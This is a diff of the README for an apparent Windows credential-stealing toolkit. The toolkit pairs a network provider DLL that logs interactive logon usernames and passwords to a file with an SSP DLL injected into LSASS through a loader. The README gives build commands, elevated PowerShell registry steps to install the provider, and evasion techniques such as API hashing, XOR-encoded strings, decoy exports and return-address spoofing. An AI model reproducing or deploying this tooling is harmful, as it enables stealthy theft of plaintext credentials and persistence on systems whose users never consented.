@@ -17,44 +17,22 @@ A small **SSP loader** executable registers the SSP DLL at runtime.
 ```
 providerexperiments/
 ├── README.md
-<<<<<<< HEAD
 ├── LICENSE
 ├── securityaddon/
 │   ├── SecurityAddon.sln
 │   └── SecurityAddon/              → SecurityAddon.dll (SSP)
 ├── testingProvider/
-│   └── TestingProvider/            → source only (TestingProvider.c + .def)
+│   └── TestingProvider/            → TestingProvider.c + TestingProvider.def only
 └── LoadingofSSPClassic/
     ├── LoadingofSSPClassic.sln
     └── LoadingofSSPClassic/        → LoadingofSSPClassic.exe (SSP loader)
 ```
 
-| Component | Solution | Output |
-|-----------|----------|--------|
-| SSP DLL | `securityaddon/SecurityAddon.sln` | `SecurityAddon.dll` |
-| Network provider | `testingProvider/TestingProvider/` | `TestingProvider.dll` (build with `cl` — no VS project) |
-| SSP loader | `LoadingofSSPClassic/LoadingofSSPClassic.sln` | `LoadingofSSPClassic.exe` |
-=======
-├── network-provider/
-│   └── TestingProviderAdv.c      
-│   └── TestingProviderAdv.def
-│   └── TestingProvider.c         # simpler baseline
-├── ssp/
-│   └── SecuritzProvidercat/      # Visual Studio solution
-└── ssp-loader/
-    └── LoadingofSSP/             # Visual Studio solution
-        ├── LoadingofSSP/         # refactored loader (LoadingofSSPnewshit.cpp)
-        └── LoadingofSSPClassic/  # classic monolithic loader
-```
-
-Current source locations on disk (before merge):
-
-| Component | Path |
-|-----------|------|
-| Network provider | `nppspy/nppspy/TestingProviderAdv.c` |
-| SSP DLL | `SecurityAddon` |
-| SSP loader (classic) | `SSPLOADINGTEST/LoadingofSSP/LoadingofSSPClassic/` |
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
+| Component | Build | Output |
+|-----------|-------|--------|
+| SSP DLL | `securityaddon/SecurityAddon.sln` (VS 2022, Release x64) | `SecurityAddon.dll` |
+| Network provider | `cl` + `.def` — **no Visual Studio project** | `TestingProvider.dll` |
+| SSP loader | `LoadingofSSPClassic/LoadingofSSPClassic.sln` (VS 2022, Release x64) | `LoadingofSSPClassic.exe` |
 
 ---
 
@@ -63,11 +41,7 @@ Current source locations on disk (before merge):
 ```mermaid
 flowchart LR
     subgraph logon [Interactive logon]
-<<<<<<< HEAD
         NP[TestingProvider.dll]
-=======
-        NP[TestingProviderAdv.dll]
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
         NP -->|NPLogonNotify| NPLog[C:\Windows\Tasks\temp40.txt]
     end
 
@@ -81,11 +55,7 @@ flowchart LR
 
 | Piece | Role | MITRE |
 |-------|------|-------|
-<<<<<<< HEAD
 | `TestingProvider.dll` | MPR network provider; hooks interactive logon | T1556.008 |
-=======
-| `TestingProviderAdv.dll` | MPR network provider; hooks interactive logon | T1556.008 |
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
 | `SecurityAddon.dll` | LSA SSP; receives credentials inside LSASS | T1547.005 |
 | `LoadingofSSPClassic.exe` | User-mode loader; calls `AddSecurityPackageA` | — |
 
@@ -93,78 +63,73 @@ The **network provider** and **SSP** are independent. You can deploy either or b
 
 ---
 
-<<<<<<< HEAD
 ## 1. Network Provider — `TestingProvider`
 
-**Source:** `testingProvider/TestingProvider/` (`TestingProvider.c` + `TestingProvider.def`) — no Visual Studio project.
-=======
-## 1. Network Provider — `TestingProviderAdv`
+**Source only:** `testingProvider/TestingProvider/`
 
-**File:** `TestingProviderAdv.c` (+ `TestingProviderAdv.def`)  
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
+| File | Purpose |
+|------|---------|
+| `TestingProvider.c` | All code (NP exports, API hashing, logging) |
+| `TestingProvider.def` | Export table aliases for decoy WinAPI names |
+
+No `.h` files and no Visual Studio project — just these two files plus the SDK at build time.
 
 ### What it does
 
-- Registers as a network provider.
+- Registers as a **Multiple Provider Router (MPR)** network provider.
 - Implements `NPLogonNotify` and writes username/password from `MSV1_0_INTERACTIVE_LOGON` to:
   - `C:\Windows\Tasks\temp40.txt`
 - Resolves `kernel32` APIs at runtime via **DJB2 hashing** (no plain API name strings in `.rdata`).
 - Calls a random subset of resolved APIs on each logon (benign jitter).
 - Exports a plausible NP surface (`NPGetCaps`, `NPAddConnection`, …) plus **decoy WinAPI-named stubs** in the export table (`.def` forwards).
 
+> Do **not** `#include <npapi.h>` — signatures conflict with the local implementations. `Windows.h` already provides `WN_*` return codes via `winnetwk.h`.
+
 ### Build
 
-Build from a **x64 Native Tools** prompt:
+From an **x64 Native Tools Command Prompt for VS**:
 
 ```bat
-<<<<<<< HEAD
 cd testingProvider\TestingProvider
 cl /nologo /O2 /LD TestingProvider.c /link /DEF:TestingProvider.def Mpr.lib /OUT:TestingProvider.dll
 ```
 
-Output: `TestingProvider.dll`
-=======
-cl /nologo /O2 /LD TestingProviderAdv.c /link /DEF:TestingProviderAdv.def /OUT:TestingProviderAdv.dll
-```
-
-Output: `TestingProviderAdv.dll`
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
+Output: `TestingProvider.dll` in the same folder.
 
 ### Install (registry)
 
 Copy the DLL to System32 (or another path and update `ProviderPath`):
 
 ```bat
-<<<<<<< HEAD
-copy TestingProvider\x64\Release\TestingProvider.dll %SystemRoot%\System32\TestingProvider.dll
-=======
-copy TestingProviderAdv.dll %SystemRoot%\System32\TestingProviderAdv.dll
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
+copy TestingProvider.dll %SystemRoot%\System32\TestingProvider.dll
 ```
 
-```reg
-$NetworkProviderName = "TestProvider"
+PowerShell (run elevated):
 
-New-Item -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\$NetworkProviderName"  
-New-Item -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\$NetworkProviderName\\NetworkProvider"  
-New-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\$NetworkProviderName\\NetworkProvider" -Name "Class" -Value 2  
-New-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\$NetworkProviderName\\NetworkProvider" -Name "Name" -Value \$NetworkProviderName  
-New-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\$NetworkProviderName\\NetworkProvider" -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\\System32\$NetworkProviderName.dll"
+```powershell
+$NetworkProviderName = "TestingProvider"
 
-$NetworkProviderPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name ProviderOrder $NetworkProviderOrder = $NetworkProviderPath.ProviderOrder + ",$NetworkProviderName"  
-Set-ItemProperty -Path \$NetworkProviderPath.PSPath -Name ProviderOrder -Value \$NetworkProviderOrder
+New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$NetworkProviderName" -Force
+New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$NetworkProviderName\NetworkProvider" -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$NetworkProviderName\NetworkProvider" -Name "Class" -Value 2 -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$NetworkProviderName\NetworkProvider" -Name "Name" -Value $NetworkProviderName -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$NetworkProviderName\NetworkProvider" -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\$NetworkProviderName.dll" -Force
+
+$order = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name ProviderOrder).ProviderOrder
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name ProviderOrder -Value "$order,$NetworkProviderName"
 ```
 
-Reboot or relogibn the Workstation service for the provider to load on logon
+Reboot or restart the Workstation service for the provider to load on logon.
 
-**Delete**
-Delete the dll from system32\Networkprovider.dll
+### Uninstall
+
+Remove the provider from `ProviderOrder`, delete the service key, and remove the DLL from `%SystemRoot%\System32\`.
 
 ---
 
 ## 2. SSP DLL — `SecurityAddon`
 
-**Project:** `securityaddon/SecurityAddon.sln` (Visual Studio 2022, **x64 Release**)
+**Project:** `securityaddon/SecurityAddon.sln` (Visual Studio 2022, **Release | x64**)
 
 ### What it does
 
@@ -177,6 +142,13 @@ Delete the dll from system32\Networkprovider.dll
 - **30 WinAPI `_exp` decoy exports** (export-table padding only; not called from LSA callbacks).
 - Module definition: `SecurityAddon.def` (keeps exports under `/OPT:REF`).
 
+Open `securityaddon/SecurityAddon.sln` → **Release | x64** → Build.
+
+Output: `securityaddon/SecurityAddon/x64/Release/SecurityAddon.dll`
+
+```bat
+dumpbin /exports SecurityAddon.dll
+```
 
 Expect **31 exports**: `SpLsaModeInitialize` + 30 `*_exp` functions.
 
@@ -188,14 +160,12 @@ The loader expects the SSP at:
 C:\Temp\SecurityAddon.dll
 ```
 
-Either copy/rename after build:
-
 ```bat
 mkdir C:\Temp 2>nul
 copy securityaddon\SecurityAddon\x64\Release\SecurityAddon.dll C:\Temp\SecurityAddon.dll
 ```
 
-Or change the XOR-encoded path in the loader (`pathkatze` / `g_encPackagePath`) to match your filename.
+Or change the XOR-encoded path in the loader (`pathkatze[]` in `LoadingofSSP.cpp`).
 
 > **Warning:** A bad SSP DLL can crash **LSASS** and force a reboot. Test on a VM snapshot first.
 
@@ -203,18 +173,21 @@ Or change the XOR-encoded path in the loader (`pathkatze` / `g_encPackagePath`) 
 
 ## 3. SSP Loader — `LoadingofSSPClassic`
 
-**Project:** `LoadingofSSPClassic/LoadingofSSPClassic.sln` (Visual Studio 2022, **x64 Release**)
+**Project:** `LoadingofSSPClassic/LoadingofSSPClassic.sln` (Visual Studio 2022, **Release | x64**)
 
-
-### What the  loader does
+### What the loader does
 
 1. Optional benign noise (`keineaufruhr` loops, WinAPI `_exp` export wrappers).
 2. Decodes XOR-embedded strings (`doTheMath3G`, key `{ 0x67, 0xDD, 0xFE }`):
    - SSP path → `C:\Temp\SecurityAddon.dll`
    - Module name → `sspicli.dll` (reference only; active path uses PEB hash lookup)
-3. Resolves **ntdll**, **kernel32**, **sspicli.dll** via **Jenkins hash** (`GMH` / `GPAH`) — no plain `GetProcAddress("AddSecurityPackageA")` in the hot path.
+3. Resolves **ntdll**, **kernel32**, **sspicli.dll** via **Jenkins hash** (`GMH` / `GPAH`).
 4. Finds `call r12` gadget in ntdll (`\x41\xFF\xD4`).
 5. Invokes `AddSecurityPackageA` through **`ChangeRetAddress`** (`patching.asm`) — return-address spoofed call.
+
+Open `LoadingofSSPClassic/LoadingofSSPClassic.sln` → **Release | x64** → Build.
+
+Output: `LoadingofSSPClassic/LoadingofSSPClassic/x64/Release/LoadingofSSPClassic.exe`
 
 ### Run
 
@@ -222,12 +195,13 @@ Or change the XOR-encoded path in the loader (`pathkatze` / `g_encPackagePath`) 
 LoadingofSSPClassic.exe
 ```
 
-Run from an **elevated** context if required by your environment. The loader expects `sspicli.dll` to already be mapped (normally true when `Secur32.lib` is linked). On success, `AddSecurityPackageA` registers the SSP into LSASS.
+Run elevated if required. The loader expects `sspicli.dll` to already be mapped (normally true when `Secur32.lib` is linked). On success, `AddSecurityPackageA` registers the SSP into LSASS.
 
 After loading, trigger an interactive logon and check `c:\windows\Temp\logged-pw.txt`.
 
 ### Changing the SSP path
-edit `pathkatze[]` in `LoadingofSSP.cpp`.  
+
+Edit `pathkatze[]` in `LoadingofSSPClassic/LoadingofSSPClassic/LoadingofSSP.cpp`.  
 Re-encode with 3-byte rolling XOR (`0x67`, `0xDD`, `0xFE`).
 
 ---
@@ -246,11 +220,7 @@ SSP registration is **volatile** — it does not survive LSASS restart/reboot th
 
 ## End-to-end network provider workflow
 
-<<<<<<< HEAD
-1. Build `TestingProvider.dll`.
-=======
-1. Build `TestingProviderAdv.dll`.
->>>>>>> 18a76b8823a8e72c9198702d2923315ece969bab
+1. Build `TestingProvider.dll` (`TestingProvider.c` + `TestingProvider.def`).
 2. Install registry keys (see above).
 3. Reboot or restart services.
 4. Interactive logon → check `C:\Windows\Tasks\temp40.txt`.
@@ -262,13 +232,21 @@ SSP registration is **volatile** — it does not survive LSASS restart/reboot th
 | Symptom | Likely cause |
 |---------|----------------|
 | LSASS crash / forced reboot | SSP bug (bad `UNICODE_STRING` handling, CRT in callbacks, etc.) |
-| Loader exits immediately (refactored build) | Sandbox gate (`SSP_ENABLE_SANDBOX_GATE`) or silent Release (`SSP_DEBUG=0`) |
-| `sspicli.dll not loaded` | Process has no SSPI imports; call `InitSecurityInterfaceA()` first or load `sspicli.dll` explicitly |
+| `sspicli.dll not loaded` | Process has no SSPI imports; load `sspicli.dll` explicitly or call `InitSecurityInterfaceA()` |
 | No SSP log file | Package not registered, wrong DLL path, or no logon event yet |
 | No NP log file | Provider not in `ProviderOrder`, wrong architecture (must be x64), or not an interactive logon |
+| C2375 on `NPGetCaps` etc. | `#include <npapi.h>` — remove it; use local constants only |
 
 **Event Viewer:** Application log → filter `lsass.exe` / faulting module for SSP crashes.
 
+---
+
+## Requirements
+
+- Windows 10/11 x64
+- Visual Studio 2022 with **Desktop development with C++** and **MASM** (SSP projects)
+- Windows SDK
+- **x64 Native Tools Command Prompt** (network provider `cl` build)
 
 ---
 
